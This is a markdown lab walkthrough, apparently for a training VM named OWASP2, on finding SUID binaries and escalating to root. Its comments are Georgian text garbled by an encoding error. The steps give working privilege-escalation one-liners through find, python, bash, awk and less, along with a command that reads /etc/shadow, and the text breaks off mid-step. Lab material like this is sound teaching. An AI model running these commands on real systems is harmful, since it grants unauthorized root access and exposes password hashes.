## Phase 3: SUID Discovery & Exploitation ğŸ’¥

### STEP 1: SUID Binary Discovery

```bash
# Target OWASP2-áƒ–áƒ” (hackme user)
find / -perm -4000 -type f 2>/dev/null | grep tmp
# Expected output:
# /tmp/vuln_find
# /tmp/vuln_python
# /tmp/vuln_bash  
# /tmp/vuln_awk
# /tmp/vuln_less
# /tmp/vuln_more

# Detailed verification
ls -la /tmp/vuln_*
```

### STEP 2: ğŸ¯ Method 1 - Find Exploitation (áƒ§áƒ•áƒ”áƒšáƒáƒ–áƒ” áƒ¡áƒáƒ˜áƒ›áƒ”áƒ“áƒ)

```bash
# Target OWASP2-áƒ–áƒ” (hackme user)
/tmp/vuln_find . -exec /bin/bash -p \; -quit

# Root shell verification
whoami
# Output: root

id
# Output: uid=0(root) gid=0(root) groups=0(root)

# Test root access
cat /etc/shadow | head -2
```

### STEP 3: ğŸ Method 2 - Python2 Exploitation

```bash
# áƒ—áƒ£ find áƒáƒ  áƒ˜áƒ›áƒ£áƒ¨áƒáƒ•áƒ, áƒ¡áƒªáƒáƒ“áƒ” Python2
/tmp/vuln_python -c "import os; os.setuid(0); os.system('/bin/bash -p')"

# áƒáƒšáƒ¢áƒ”áƒ áƒœáƒáƒ¢áƒ˜áƒ£áƒšáƒ˜ Python2 payload
/tmp/vuln_python -c "import os; os.setuid(0); os.setgid(0); os.system('/bin/bash')"

# GTFOBins Python2 method
/tmp/vuln_python -c "import os; os.execl('/bin/sh', 'sh', '-p')"
```

### STEP 4: ğŸ’¥ Method 3 - Bash Exploitation

```bash
# Direct bash SUID
/tmp/vuln_bash -p

# -p flag preserves privileged mode
whoami
# Should output: root
```

### STEP 5: âš¡ Method 4 - AWK Exploitation

```bash
# AWK command execution
/tmp/vuln_awk 'BEGIN {system("/bin/bash -p")}'

# Alternative AWK method
echo | /tmp/vuln_awk '{system("/bin/bash -p")}'

# GTFOBins AWK payload
/tmp/vuln_awk 'BEGIN {system("/bin/sh")}'
```

### STEP 6: ğŸ“– Method 5 - Less/More Exploitation

```bash
# Less method
/tmp/vuln_less /etc/passwd
# áƒ¨áƒ”áƒ›áƒ“áƒ”áƒ’ less-áƒ¨áƒ˜ áƒ“áƒáƒ¬áƒ”áƒ áƒ”: !/bin/bash -p

